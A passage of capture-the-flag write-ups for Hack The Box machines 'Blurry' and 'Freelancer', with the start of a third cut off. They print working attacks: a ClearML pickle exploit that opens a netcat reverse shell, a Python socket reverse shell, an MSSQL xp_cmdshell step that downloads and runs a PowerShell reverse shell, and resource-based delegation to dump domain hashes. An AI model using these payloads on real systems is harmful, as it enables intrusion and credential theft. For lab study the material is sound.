After visiting all the subdomains, I noticed that files.blurry.htb only displayed a simple \u0026ldquo;OK\u0026rdquo; message.\nThe app.blurry.htb subdomain hosts ClearML, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.\nThe chat.blurry.htb subdomain hosts the third-party service Rocket.Chat on its own.\nIt looks similar to Discord. I registered an account and logged in to the page.\nThere seems to be a default #general channel for new accounts, which reveals that jippity is the admin.\nUser Flag Now, I will try to set up ClearML locally on my machine.\nI followed this guide to set it up:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/blurry] ‚îî‚îÄ$ sudo apt install python3.11-venv [sudo] password for kali: Reading package lists... Done Building dependency tree... Done Reading state information... Done The following packages were automatically installed and are no longer required: libdaxctl1 libgphoto2-l10n libndctl6 libntfs-3g89 libpmem1 libre2-10 linux-image-6.6.9-amd64 python3-mistune0 samba-ad-provision samba-dsdb-modules Use \u0026#39;sudo apt autoremove\u0026#39; to remove them. The following NEW packages will be installed: python3.11-venv 0 upgraded, 1 newly installed, 0 to remove and 394 not upgraded. Need to get 5,884 B of archives. After this operation, 28.7 kB of additional disk space will be used. Get:1 http://kali.download/kali kali-rolling/main amd64 python3.11-venv amd64 3.11.9-1 [5,884 B] Fetched 5,884 B in 0s (62.8 kB/s) Selecting previously unselected package python3.11-venv. (Reading database ... 461710 files and directories currently installed.) Preparing to unpack .../python3.11-venv_3.11.9-1_amd64.deb ... Unpacking python3.11-venv (3.11.9-1) ... Setting up python3.11-venv (3.11.9-1) ... ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/blurry] ‚îî‚îÄ$ python3 -m venv .env ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/blurry] ‚îî‚îÄ$ source .env/bin/activate ‚îå‚îÄ‚îÄ(.env)‚îÄ(kali„âøkali)-[~/blurry] ‚îî‚îÄ$ pip install clearml [...INSTALLING CLEARML....] ‚îå‚îÄ‚îÄ(.env)‚îÄ(kali„âøkali)-[~/blurry] ‚îî‚îÄ$ clearml-init ClearML SDK setup process Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) Or create a free account at https://app.clear.ml/settings/workspace-configuration In settings page, press \u0026#34;Create new credentials\u0026#34;, then press \u0026#34;Copy to clipboard\u0026#34;. Paste copied configuration here: api { web_server: http://app.blurry.htb api_server: http://api.blurry.htb files_server: http://files.blurry.htb credentials { \u0026#34;access_key\u0026#34; = \u0026#34;Y2Y197NIHJ5OJJRTFBAR\u0026#34; \u0026#34;secret_key\u0026#34; = \u0026#34;Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3\u0026#34; } } Detected credentials key=\u0026#34;Y2Y197NIHJ5OJJRTFBAR\u0026#34; secret=\u0026#34;Kx5U***\u0026#34; ClearML Hosts configuration: Web App: http://app.blurry.htb API: http://api.blurry.htb File Store: http://files.blurry.htb Verifying credentials ... Credentials verified! New configuration stored in /home/kali/clearml.conf ClearML setup completed successfully. The configuration file can be found at the app.blurry.htb endpoint when we enter a username, select \u0026ldquo;New Experiment,\u0026rdquo; and retrieve the config file from there.\nI found a recent CVE-2024‚Äì24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import os import subprocess from clearml import Task class ShellExecutor: def __reduce__(self): cmd = \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.62 4444 \u0026gt;/tmp/f\u0026#34; return (subprocess.call, (cmd,)) shell_executor = ShellExecutor() task = Task.init( project_name=\u0026#34;Black Swan\u0026#34;, task_name=\u0026#34;r3zyd3v\u0026#34;, tags=[\u0026#34;review\u0026#34;], task_type=Task.TaskTypes.data_processing, output_uri=True ) task.upload_artifact( name=\u0026#34;r3zyd3v\u0026#34;, artifact_object=shell_executor, retries=2, wait_on_upload=True ) task.execute_remotely(queue_name=\u0026#39;default\u0026#39;) Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:\ncmd = \u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.62 4444 \u0026gt;/tmp/f\u0026quot; here.\nOnce we run the script, it creates a task, uploads the artifact, and then we receive the shell.\nAt this point, we have a shell as the user and have obtained the user flag.\nRoot Flag If I run sudo -l, I can see that I can execute the /usr/bin/evaluate_model binary as root without needing a password.\n1 2 3 4 5 6 7 jippity@blurry:~$ sudo -l Matching Defaults entries for jippity on blurry: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jippity may run the following commands on blurry: (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth This Bash script searches for files that end with .pth in the /models directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.\nI will now open a Netcat session on my Kali machine on port 6969. Then, I removed the evaluate_model.py script from the /models directory.\n1 2 3 4 5 6 7 jippity@blurry:~$ cd /models jippity@blurry:/models$ ls demo_model.pth evaluate_model.py jippity@blurry:/models$ rm -r evaluate_model.py rm: remove write-protected regular file \u0026#39;evaluate_model.py\u0026#39;? y jippity@blurry:/models$ ls demo_model.pth I created the same file (which I made using echo and appended the code) named evaluate_model.py with the script shown below (the output of the cat command):\n1 2 3 jippity@blurry:/models$ echo \u0026#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\u0026#34;10.10.16.62\u0026#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; evaluate_model.py jippity@blurry:/models$ cat evaluate_model.py echo \u0026#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\u0026#34;10.10.16.62\u0026#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; evaluate_model.py I ran sudo /usr/bin/evaluate_model /models/*.pth, and when I checked my Netcat session, I saw:\n1 2 3 4 5 6 7 8 9 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/blurry/CVE] ‚îî‚îÄ$ nc -lnvp 6969 listening on [any] 6969 ... connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976 root@blurry:/models# cd ~ cd ~ root@blurry:~# id id uid=0(root) gid=0(root) groups=0(root) We rooted this box.\nConclusion Thank you for following my write-up for this medium yet fun box from Hack The Box!\n","permalink":"http://localhost:1313/writeups/hackthebox/blurry/","summary":"Blurry is a medium-difficulty Linux machine exploiting recent ClearML CVEs (CVE-2024-24590 to CVE-2024-24595) for RCE via its web, API, and file services. Privilege escalation involves crafting a malicious PyTorch model to bypass insecure deserialization checks using runpy.","title":"Blurry Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/Freelancer Difficulty Hard Machine Windows Enumeration I ran nmap quickly to find open ports using: nmap 10.10.11.5 -T4 -vv\n1 2 3 4 5 6 7 8 9 10 11 12 13 PORT STATE SERVICE REASON 53/tcp open domain syn-ack 80/tcp open http syn-ack 88/tcp open kerberos-sec syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 389/tcp open ldap syn-ack 445/tcp open microsoft-ds syn-ack 464/tcp open kpasswd5 syn-ack 593/tcp open http-rpc-epmap syn-ack 636/tcp open ldapssl syn-ack 3268/tcp open globalcatLDAP syn-ack 3269/tcp open globalcatLDAPssl syn-ack With this open ports, I did agressive nmap scan using: sudo nmap 10.10.11.5 -T4 -vv -p53,80,88,135,139,389,445,464,593,636,3268,3269 -A -sC -sV -O\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 nginx 1.25.5 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://freelancer.htb/ |_http-server-header: nginx/1.25.5 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-04 10:13:26Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.94SVN%E=4%D=6/4%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=665EA414%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U) OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS) WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70) ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4h53m57s | smb2-time: | date: 2024-06-04T10:13:40 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 53827/tcp): CLEAN (Timeout) | Check 2 (port 56435/tcp): CLEAN (Timeout) | Check 3 (port 55524/udp): CLEAN (Timeout) | Check 4 (port 39076/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required I added the freelancer.htb to /etc/hosts to make sure the site loads using echo \u0026quot;10.10.11.5 freelancer.htb\u0026quot; \u0026gt;\u0026gt; /etc/hosts\nThis is how the freelancer site looks:\nIn this site, we can create account for employer or freelancer.\nI created a freelancer user with following details:\n1 2 3 --\u0026gt; freelancer info \u0026lt;-- freelancer_rezy \u0026gt; username mail@gmail.com \u0026gt; email I will also create a account of employeer with following details:\n1 2 3 4 5 6 7 --\u0026gt; employer info \u0026lt;--- employercoo_l \u0026gt; username erezrrrr1@gmail.com \u0026gt; email sdlhjkgbfdjksjkskjsdhjkfs \u0026gt; password fav movie \u0026gt; spiderman pet \u0026gt; dog friend\u0026#39;s name \u0026gt; john The site has note that, after creating account for employer we aren‚Äôt able to login as it will be reviewed before it is activated.\nI used the forget password functionality to change the password of the account employer to see if it allows us to login once we change the password. If yes the backend code has logic errors.\nIt worked and I changed the existing password to spiderman123! I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.\nLooking around the website, and my eye was caught this QR code.\nSo this link can let us login without using credentials.\nThe link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.\nFrom here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.\nWe need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.\nI also found a comment to enumerate the users in this web app.\nI fuzzed the userId in this link: http://freelancer.htb/accounts/profile/visit/$userID$/ and found that ID 2 = admin user.\nNow, I will use the userID to login to user admin.\nUser Flag I visited the link: http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/ to login to user admin. Here Mg== is the base64 encoded form of ‚Äú2‚Äù. And the md5 hash is just the token given from QR. I didn‚Äôt change it.\nAfter exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found /admin endpoint. As i am already the user admin, I was able to access it:\nHere, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.\nAs it is Windows box, it is most likely MSSQL. So, I will use the rev shelll script from: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands\nFirst I used to impersonate as user System Admin. (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users)\n1 EXECUTE AS LOGIN = \u0026#39;sa\u0026#39; Then,\n1 2 3 4 5 6 sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; RECONFIGURE sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; RECONFIGURE EXEC master..xp_cmdshell \u0026#39;whoami\u0026#39; I can see it is sql_svc account.\nNow, I ran:\n1 EXECUTE xp_cmdshell \u0026#39;powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)\u0026#39; This downloads the reverse shell powershell script from my kali machine to target machine.\nThe script contents the following script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 do { Start-Sleep -Seconds 1 try { $TCPClient = New-Object Net.Sockets.TCPClient(\u0026#39;10.10.14.72\u0026#39;, 8888) } catch {} } until ($TCPClient.Connected) $NetworkStream = $TCPClient.GetStream() $StreamWriter = New-Object IO.StreamWriter($NetworkStream) function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0} $StreamWriter.Write($String + \u0026#39;H3K3R-SHELL[#]\u0026gt; \u0026#39;) $StreamWriter.Flush() } WriteToStream \u0026#39;\u0026#39; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1) $Output = try { Invoke-Expression $Command 2\u0026gt;\u0026amp;1 | Out-String } catch { $_ | Out-String }\tWriteToStream ($Output) } $StreamWriter.Close() We get a reverse shell now:\nAt users directory, i can see users in this box:\nAs i am sql_svc user, I will try to enumerate the user sql_svc to see if there is anything interesting.\nAt Directory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU\nThere are following files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Directory: C:\\Users\\sql_svc\\Downloads\\SQLEXPR-2019_x64_ENU Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/27/2024 1:52 PM 1033_ENU_LP d----- 5/27/2024 1:52 PM redist d----- 5/27/2024 1:52 PM resources d----- 5/27/2024 1:52 PM x64 -a---- 9/24/2019 9:00 PM 45 AUTORUN.INF -a---- 9/24/2019 9:00 PM 784 MEDIAINFO.XML -a---- 9/29/2023 4:49 AM 16 PackageId.dat -a---- 9/24/2019 9:00 PM 142944 SETUP.EXE -a---- 9/24/2019 9:00 PM 486 SETUP.EXE.CONFIG -a---- 5/27/2024 4:58 PM 724 sql-Configuration.INI -a---- 9/24/2019 9:00 PM 249448 SQLSETUPBOOTSTRAPPER.DLL Where, sql-Configuration.INI file contains the following configurations:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 SHELL\u0026gt; cat sql-Configuration.INI [OPTIONS] ACTION=\u0026#34;Install\u0026#34; QUIET=\u0026#34;True\u0026#34; FEATURES=SQL INSTANCENAME=\u0026#34;SQLEXPRESS\u0026#34; INSTANCEID=\u0026#34;SQLEXPRESS\u0026#34; RSSVCACCOUNT=\u0026#34;NT Service\\ReportServer$SQLEXPRESS\u0026#34; AGTSVCACCOUNT=\u0026#34;NT AUTHORITY\\NETWORK SERVICE\u0026#34; AGTSVCSTARTUPTYPE=\u0026#34;Manual\u0026#34; COMMFABRICPORT=\u0026#34;0\u0026#34; COMMFABRICNETWORKLEVEL=\u0026#34;\u0026#34;0\u0026#34; COMMFABRICENCRYPTION=\u0026#34;0\u0026#34; MATRIXCMBRICKCOMMPORT=\u0026#34;0\u0026#34; SQLSVCSTARTUPTYPE=\u0026#34;Automatic\u0026#34; FILESTREAMLEVEL=\u0026#34;0\u0026#34; ENABLERANU=\u0026#34;False\u0026#34; SQLCOLLATION=\u0026#34;SQL_Latin1_General_CP1_CI_AS\u0026#34; SQLSVCACCOUNT=\u0026#34;FREELANCER\\sql_svc\u0026#34; SQLSVCPASSWORD=\u0026#34;IL0v3ErenY3ager\u0026#34; Here, SQLSVCPASSWORD=\u0026quot;IL0v3ErenY3ager\u0026quot; is a password revealed. I will try to pass this password using crackmapexec to the users that were in users directory.\n1 2 3 4 5 6 7 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/htb/freelancer] ‚îî‚îÄ$ crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager SMB 10.10.11.5 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False) SMB 10.10.11.5 445 DC [-] freelancer.htb\\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.10.11.5 445 DC [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager As we can see the password for the user mikasaAckerman is IL0v3ErenY3ager.\nNow, I will upload runasCs to the box and try to inject the above credentials to the memory.\nTo upload runascs to my target machine, i will use command: Invoke-WebRequest \u0026quot;http://10.10.14.72:8000/RunasCs.exe\u0026quot; -OutFile \u0026quot;runascs.exe\u0026quot; to my current SHELL\u0026gt; session.\nI ran nc -nvlp 6969 then ran ./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.72:6969 on my current windows rev shell.\nI see myself as mikasaAckerman user. And the desktop of this user contains the user flag.\nRoot Flag In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:\n1 2 3 4 5 Hello Mikasa, I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the \u0026#34;DATACENTER-2019\u0026#34; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019. I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server\u0026#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart. Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue. Best regards, There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server.\nFirst I opened a smb server using command: impacket-smbserver share . -smb2support -user rezy -password rezy. And then mounted the share using:\n1 2 3 4 5 6 7 8 9 $SharePath = \u0026#34;\\\\10.10.14.72\\share\u0026#34; $Username = \u0026#34;rezy\u0026#34; $Password = \u0026#34;rezy\u0026#34; # Create a credential object $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force) # Mount the SMB share net use Z: $SharePath $Password /user:$Username /persistent:no This will mount the smb share from linux to windows. Then to confirm I can do this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\mikasaAckerman\\Desktop\u0026gt; Get-PSDrive Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- Alias Alias C 13.67 1.79 FileSystem C:\\ Users\\Administrator\\Documents Cert Certificate \\ Env Environment Function Function HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE Variable Variable WSMan WSMan Z ...3478272.00 0.00 FileSystem \\\\10.10.14.72\\share As we can see it‚Äôs Z drive. I can simply run:\n1 Copy-Item -Path \u0026#34;C:\\Users\\mikasaAckerman\\Desktop\\MEMORY.7z\u0026#34; -Destination \u0026#34;Z:\\\u0026#34; to transfer file to the smb share and we can access it from our kali box.\nI then, used https://github.com/ufrisk/MemProcFS to dump the file and mount it.\nI found the SAM, SYSTEM and SECURITY files in registry/hive_files. I Dumped it with secretsdump and I get a password: PWN3D#l0rr@Armessa199 which is a password for the user lorra199\nI will login to it using evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199\nNow, we need to syncronize the server time.\n1 2 3 4 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali] ‚îî‚îÄ# ntpdate -u freelancer.htb 2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap CLOCK: time stepped by 17631.477286 17631.477286 seconds is around 5 hours. So, I ran:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali] ‚îî‚îÄ# faketime -f +5h bloodhound-python -c ALL -u lorra199 -p \u0026#39;PWN3D#l0rr@Armessa199\u0026#39; -d freelancer.htb -ns 10.10.11.5 INFO: Found AD domain: freelancer.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.freelancer.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc.freelancer.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 13 computers INFO: Connecting to LDAP server: dc.freelancer.htb INFO: Found 30 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: SetupMachine.freelancer.htb INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: INFO: Querying computer: Datacenter-2019 INFO: Querying computer: DC.freelancer.htb WARNING: Could not resolve: Datacenter-2019: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.5@53 answered The DNS operation timed out. INFO: Done in 00M 17S This generated json files in the directory where we ran the command. This will be the file we will upload it to bloodhound and enumerate it to find path to root.\nIf you see the image above, lorra199 is member of AD REcycle bin group which has generic write permission to DC2.\nSo we can perform Resource Based Constrained Delegation, Using this a Domain admin can allow a computer to impersonate a user or computer against a service of a machine.\nI will now run,\n1 2 3 4 5 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ impacket-addcomputer -computer-name \u0026#39;HEKER$\u0026#39; -computer-pass \u0026#39;Heker123@!\u0026#39; -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:\u0026#39;PWN3D#l0rr@Armessa199\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [*] Successfully added machine account HEKER$ with password Heker123@!. The impacket-addcomputer command is used to add a computer account to a domain\nNow we will use impacket rbcd to delegate:\n1 impacket-rbcd -delegate-from \u0026#39;HEKER$\u0026#39; -delegate-to \u0026#39;DC$\u0026#39; -dc-ip 10.10.11.5 -action \u0026#39;write\u0026#39; \u0026#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199\u0026#39; delegate-from 'HEKER$': Specifies the computer account that will delegate permissions. In this case, it\u0026rsquo;s \u0026ldquo;HEKER$\u0026rdquo;. delegate-to 'DC$': Specifies the computer account that will receive the delegated permissions. In this case, it\u0026rsquo;s \u0026ldquo;DC$\u0026rdquo;. dc-ip 10.10.11.5: Specifies the IP address of the domain controller. In this case, it\u0026rsquo;s \u0026ldquo;10.10.11.5\u0026rdquo;. action 'write': Specifies the action to be taken. In this case, it\u0026rsquo;s \u0026ldquo;write\u0026rdquo;, which means it will write the delegation settings. 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199': Specifies the domain and credentials used to authenticate. In this case, it\u0026rsquo;s the \u0026ldquo;freelancer.htb\u0026rdquo; domain, with the username \u0026ldquo;lorra199\u0026rdquo; and password \u0026ldquo;PWN3D#l0rr@Armessa199\u0026rdquo;. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ impacket-rbcd -delegate-from \u0026#39;HEKER$\u0026#39; -delegate-to \u0026#39;DC$\u0026#39; -dc-ip 10.10.11.5 -action \u0026#39;write\u0026#39; \u0026#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [*] Accounts allowed to act on behalf of other identity: [*] rbcd_account$ (S-1-5-21-3542429192-2036945976-3483670807-11604) [*] parrot$ (S-1-5-21-3542429192-2036945976-3483670807-11601) [*] BIGNAMEMUST$ (S-1-5-21-3542429192-2036945976-3483670807-11605) [*] ATTACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11603) [*] WINGER$ (S-1-5-21-3542429192-2036945976-3483670807-11606) [*] WINGERABCDEFG$ (S-1-5-21-3542429192-2036945976-3483670807-11607) [*] ATTATTATTATTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11608) [*] HACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11609) [*] Delegation rights modified successfully! [*] HEKER$ can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] rbcd_account$ (S-1-5-21-3542429192-2036945976-3483670807-11604) [*] parrot$ (S-1-5-21-3542429192-2036945976-3483670807-11601) [*] BIGNAMEMUST$ (S-1-5-21-3542429192-2036945976-3483670807-11605) [*] ATTACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11603) [*] WINGER$ (S-1-5-21-3542429192-2036945976-3483670807-11606) [*] WINGERABCDEFG$ (S-1-5-21-3542429192-2036945976-3483670807-11607) [*] ATTATTATTATTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11608) [*] HACKERSYSTEM$ (S-1-5-21-3542429192-2036945976-3483670807-11609) [*] HEKER$ (S-1-5-21-3542429192-2036945976-3483670807-11610) Now we can see we are able to act on behalf of other identity. Now i will use impcket to get service ticket from dc.\n1 faketime -f +5h impacket-getST -spn \u0026#39;cifs/dc.freelncer.htb\u0026#39; -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/HEKER$:\u0026#39;Heker123@!\u0026#39; i will now import the ticket and use secretsdump to get the hash of admin account.\nTo import the ticket, I will simply do export KRB5CCNAME=Administrator.ccache and run the following command:\n1 faketime -f +5h impacket-secretsdump \u0026#39;freelancer.htb/Administrator@DC.freelancer.htb\u0026#39; -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm We will recieve Hash for user accounts in this DC along with Administrator‚Äôs. Now, i will simply use the hash of Administrator and pass the hash with evil-winrm to get access to root account.\n1 2 3 4 5 6 7 8 9 10 11 12 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami freelancer\\administrator As you can see, we got to administrator as well and got root flag too.\nConclusion Thanks for following my walk-through on this fun AD box.\n","permalink":"http://localhost:1313/writeups/hackthebox/freelancer/","summary":"Freelancer is a hard Windows machine emphasizing real-world pentesting with IDOR, auth bypass, SQL impersonation, and RCE via SQL features. It culminates in advanced AD attacks using the Recycle Bin and Backup Operators group, plus memory forensics and AV evasion.","title":"Freelancer Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/BoardLight Difficulty Easy Machine Linux Enumeration I ran the Nmap command to find all available open ports on this system using the command: nmap 10.10.11.11 -T4 -vv.\n1 2 3 **PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack** Again, I ran an aggressive scan using the command: sudo nmap 10.10.11.11 -T4 -p22,80 -A -sC -sV -O -vv. While it ran, I was looking at port 80 and enumerating the web server.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 